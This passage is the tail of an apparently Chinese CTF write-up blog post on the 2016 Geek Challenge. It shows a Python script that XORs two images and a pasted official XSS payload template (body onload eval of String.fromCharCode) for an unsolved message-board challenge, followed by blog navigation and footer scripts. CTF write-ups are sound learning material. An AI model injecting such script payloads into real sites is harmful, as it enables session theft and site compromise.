+<pre><code>file_a=open(&apos;s.png&apos;,&apos;rb&apos;)  
+file_b=open(&apos;l.png&apos;,&apos;rb&apos;)  
+
+a=file_a.read()  
+b=file_b.read()  
+
+s=&apos;&apos;  
+for i,j in zip(a,b):  
+s+=chr(ord(i)^ord(j))  
+print s
+</code></pre><h3 id="皓宝宝的留言板"><a href="#皓宝宝的留言板" class="headerlink" title="皓宝宝的留言板"></a>皓宝宝的留言板</h3><p>还没有搞明白，先把官方给的payload贴上</p>
+<pre><code>&lt;body onload=”eval(Sting.fromCharCode(编码后的东西))”&gt;&lt;/body&gt;
+</code></pre><h2 id="打这个比赛最要感谢的人就是RcoIl啦，从他那里学到了好多我之前都不知道的东西，syc给我最大的礼物就是认识了你，顺便说下-The-dream-is-to-be-realized"><a href="#打这个比赛最要感谢的人就是RcoIl啦，从他那里学到了好多我之前都不知道的东西，syc给我最大的礼物就是认识了你，顺便说下-The-dream-is-to-be-realized" class="headerlink" title="打这个比赛最要感谢的人就是RcoIl啦，从他那里学到了好多我之前都不知道的东西，syc给我最大的礼物就是认识了你，顺便说下 The dream is to be realized"></a>打这个比赛最要感谢的人就是RcoIl啦，从他那里学到了好多我之前都不知道的东西，syc给我最大的礼物就是认识了你，顺便说下 The dream is to be realized</h2>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/10/21/第七季极客大挑战/">第七季极客大挑战</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Isron</a></p>
+        <p><span>发布时间:</span>2016-10-21, 10:32:23</p>
+        <p><span>最后更新:</span>2016-11-14, 16:27:37</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/10/21/第七季极客大挑战/" title="第七季极客大挑战">https://clearloveqaq.github.io/2016/10/21/第七季极客大挑战/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://clearloveqaq.github.io/2016/10/21/第七季极客大挑战/　　作者: Isron" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/10/25/sqli-labs学习笔记总结/">
+                    sqli-labs学习笔记总结
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/10/16/sqlmap常见使用语法/">
+                    sqlmap常见使用语法
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#闪得好快"><span class="toc-number">1.1.</span> <span class="toc-text">闪得好快</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Come-game"><span class="toc-number">1.2.</span> <span class="toc-text">Come_game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#snow"><span class="toc-number">1.3.</span> <span class="toc-text">snow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#旋转跳跃"><span class="toc-number">1.4.</span> <span class="toc-text">旋转跳跃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#凯撒部长的奖励"><span class="toc-number">1.5.</span> <span class="toc-text">凯撒部长的奖励</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MD5cracker"><span class="toc-number">1.6.</span> <span class="toc-text">MD5cracker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PEN-AND-APPLE"><span class="toc-number">1.7.</span> <span class="toc-text">PEN_AND_APPLE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#藏着小秘密的流量包"><span class="toc-number">1.8.</span> <span class="toc-text">藏着小秘密的流量包</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-1"><span class="toc-number">2.1.</span> <span class="toc-text">web_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-2"><span class="toc-number">2.2.</span> <span class="toc-text">web_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Social-Engineeing"><span class="toc-number">2.3.</span> <span class="toc-text">Social Engineeing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql1"><span class="toc-number">2.4.</span> <span class="toc-text">sql1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql2"><span class="toc-number">2.5.</span> <span class="toc-text">sql2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#127-0-0-x"><span class="toc-number">2.6.</span> <span class="toc-text">127.0.0.x</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-is-fun"><span class="toc-number">2.7.</span> <span class="toc-text">php_is_fun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#撸啊撸"><span class="toc-number">2.8.</span> <span class="toc-text">撸啊撸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#上传-1"><span class="toc-number">2.9.</span> <span class="toc-text">上传(1)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#上传-2"><span class="toc-number">2.10.</span> <span class="toc-text">上传(2)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#人生苦短"><span class="toc-number">2.11.</span> <span class="toc-text">人生苦短</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#狗师傅的计算机"><span class="toc-number">2.12.</span> <span class="toc-text">狗师傅的计算机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#你是人间四月天"><span class="toc-number">2.13.</span> <span class="toc-text">你是人间四月天</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">3.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux1-2"><span class="toc-number">3.1.</span> <span class="toc-text">linux1,2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Program"><span class="toc-number">4.</span> <span class="toc-text">Program</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#compress300"><span class="toc-number">4.1.</span> <span class="toc-text">compress300</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#单身二十年"><span class="toc-number">4.2.</span> <span class="toc-text">单身二十年</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#米有做出来的题目"><span class="toc-number">5.</span> <span class="toc-text">米有做出来的题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#我好菜啊-杂项部分"><span class="toc-number">5.1.</span> <span class="toc-text">我好菜啊_杂项部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#皓宝宝的留言板"><span class="toc-number">5.2.</span> <span class="toc-text">皓宝宝的留言板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#打这个比赛最要感谢的人就是RcoIl啦，从他那里学到了好多我之前都不知道的东西，syc给我最大的礼物就是认识了你，顺便说下-The-dream-is-to-be-realized"><span class="toc-number">6.</span> <span class="toc-text">打这个比赛最要感谢的人就是RcoIl啦，从他那里学到了好多我之前都不知道的东西，syc给我最大的礼物就是认识了你，顺便说下 The dream is to be realized</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+
+    
+        <div class="addthis_sharing_toolbox"></div>
+    
+</div>
+
+
+
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <div id="comment-box" ></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2016/10/21/第七季极客大挑战/" data-title="第七季极客大挑战" data-url="https://clearloveqaq.github.io/2016/10/21/第七季极客大挑战/"></div>
+    <script>
+        var duoshuoQuery = {short_name:"clearloveqaq"};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+    </script>
+    
+    <script> loadComment(); </script>
+
+</div>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/10/25/sqli-labs学习笔记总结/" title="上一篇: sqli-labs学习笔记总结">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/10/16/sqlmap常见使用语法/" title="下一篇: sqlmap常见使用语法">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/11/14/SUCTF知识点总结/">SUCTF知识点总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/09/南邮/">南邮CTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/08/http协议/">http协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/25/sqli-labs学习笔记总结/">sqli-labs学习笔记总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/21/第七季极客大挑战/">第七季极客大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/16/sqlmap常见使用语法/">sqlmap常见使用语法</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/15/sql绕过技巧/">sql绕过技巧</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/22/sql盲注学习笔记/">sql盲注学习笔记</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016 Isron
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
